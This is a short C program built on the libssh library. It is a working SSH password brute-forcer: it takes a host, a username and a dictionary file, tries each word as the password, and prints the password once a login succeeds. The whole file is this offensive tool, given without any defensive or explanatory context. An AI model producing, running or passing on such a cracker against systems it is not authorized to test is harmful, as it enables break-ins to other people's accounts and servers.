#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libssh/libssh.h>
void ssh_auth(char *host,char *user,char *password);

main(int argc,char *argv[]) {
		FILE *fpin;
		char in;
		int resalt;
		char word[100],*passwd;
		if (argc < 4) {
				printf("Usage:%s <host> <user> <dictionary file>",argv[0]);
				exit(0);
		}
		if( ( fpin = fopen(argv[3],"r")) == NULL) {
				fprintf(stderr,"ERROR:Can't Open dictionary file %s\n",argv[3]);
		exit(1);
		}

		while( (fgets(word,100,fpin)) != NULL ) {
				passwd = strchr(word,'\n');
				if(passwd) {
						*passwd = '\0';
				}
				ssh_auth(argv[1],argv[2],word);

		}
		printf("There is no password in the dictionary\n");
		fclose(fpin);
		exit(0);
}
void ssh_auth(char *host,char *user,char *password) {
		ssh_session my_ssh_session;
		int port = 22;
		int rc;
		my_ssh_session = ssh_new();
		if(my_ssh_session == NULL) {
				exit(1);
		}
		ssh_options_set(my_ssh_session,SSH_OPTIONS_HOST,host);
		ssh_options_set(my_ssh_session,SSH_OPTIONS_PORT,&port);
		rc = ssh_connect(my_ssh_session);
		if(rc != SSH_OK) {
				fprintf(stderr,"Error connecting to localhost %s",ssh_get_error(my_ssh_session));
				exit(1);
		}
		rc = ssh_userauth_password(my_ssh_session,user,password);
		if( rc != SSH_AUTH_SUCCESS) {
				ssh_disconnect(my_ssh_session);
				ssh_free(my_ssh_session);
		}else{
				fprintf(stderr,"password Found: %s\n",password);
				ssh_disconnect(my_ssh_session);
				ssh_free(my_ssh_session);
				exit(0);
		}
}

